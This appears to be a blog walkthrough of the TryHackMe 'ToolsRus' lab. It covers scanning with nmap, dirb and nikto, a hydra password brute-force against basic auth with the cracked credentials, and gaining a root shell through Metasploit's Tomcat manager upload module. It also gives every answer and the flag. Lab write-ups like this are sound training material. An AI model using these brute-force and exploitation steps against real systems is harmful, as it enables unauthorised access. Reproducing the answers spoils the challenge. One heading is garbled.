---
clayout: ctf
title: ToolsRus
type: TryHackMe
date: 2025-04-26
level: Easy
icon: /ctf/tryhackme/tools-rus/icon-room.png
image: /ctf/tryhackme/tools-rus/icon-room.png
description: Practise using tools such as dirbuster, hydra, nmap, nikto and metasploit
ctf-link: https://tryhackme.com/room/toolsrus
---

## Challenge Overview

In this challenge, we need to find hidden directories, users, and services on a target machine. By scanning for open ports and exploring the website, we discover important information like usernames and passwords. After gaining access to protected areas, we exploit a vulnerable Tomcat server to get a shell on the machine. The final goal is to find the flag located in the root directory.

## What directory can you find, that begins with a "g"?

### Nmap Scan

We begin by scanning the target machine to enumerate open ports and services.

```bash
nmap -Pn -sC -sV -v -A -oN nmap.txt 10.10.202.254
```

**Scan Results:**

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
```

- **22/tcp** – SSH: OpenSSH 7.2p2 (Ubuntu 4ubuntu2.8)
- **80/tcp** – HTTP: Apache httpd 2.4.18
- **1234/tcp** – HTTP: Apache Tomcat/Coyote JSP engine 1.1
- **8009/tcp** – AJP13: Apache Jserv Protocol v1.3

### Web Enumeration

Accessing `http://10.10.176.173` displays the homepage:

![ToolsRus Home](/ctf/tryhackme/tools-rus/home.png)

Using `dirb` to enumerate web directories:

![dirb output](/ctf/tryhackme/tools-rus/dirb.png)

We discover the `/guidelines` directory. Upon navigating to it:

![guidelines page](/ctf/tryhackme/tools-rus/guidelines.png)

> **Answer**: `guidelines`

## Whose name can you find from this directory?

Inside the `/guidelines` page, we find the name of a user mentioned.

> **Answer**: `bob`

## What directory has basic authentication?

Reviewing the `dirb` results, we observe the `/protected` directory that prompts for basic authentication:

![protected page](/ctf/tryhackme/tools-rus/protected.png)

> **Answer**: `protected`

## What is bob's password to the protected part of the website?

We perform a brute-force attack using `hydra` to identify bob's credentials:

```bash
hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.176.173 http-get /protected
```

Result:

![hydra output](/ctf/tryhackme/tools-rus/hydra.png)

Credentials found: `bob:bubbles`

Accessing the `/protected` directory:

![protected page access](/ctf/tryhackme/tools-rus/protected-page.png)

> **Answer**: `bubbles`

## What other port that serves a web service is open on the machine?

Referring back to the `nmap` results, we observe port `1234` running a web service.

> **Answer**: `1234`

## What is the name and version of the software running on the port from question 5?

Examining the `nmap` scan output for port `1234`, we find:

![nmap tomcat](/ctf/tryhackme/tools-rus/tomcat.png)

> **Answer**: `Apache Tomcat/7.0.88`

## How many docume0

We use `nikto` to scan the Tomcat Manager portal for accessible documents:

```bash
nikto -h http://10.10.176.173:1234/manager/html -id bob:bubbles -o nikto.txt
```

Result:

![nikto output](/ctf/tryhackme/tools-rus/nikto.png)

> **Answer**: `5`

## What is the server version?

From the `nmap` results for port `80`:

```bash
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
```

> **Answer**: `Apache/2.4.18`

## What version of Apache-Coyote is this service using?

According to `nmap` results for port `1234`:

```bash
1234/tcp open http Apache Tomcat/Coyote JSP engine 1.1
```

> **Answer**: `1.1`

## What user did you get a shell as?

Using the Metasploit module `multi/http/tomcat_mgr_upload`, we gain a shell on the system:

![msf shell](/ctf/tryhackme/tools-rus/msf-shell.png)

Shell access was obtained as the `root` user.

> **Answer**: `root`

## What flag is found in the root directory?

Finally, exploring the `/root` directory yields the target flag:

![flag](/ctf/tryhackme/tools-rus/flag.png)

> **Answer**: `THM{flag_is_in_root}`
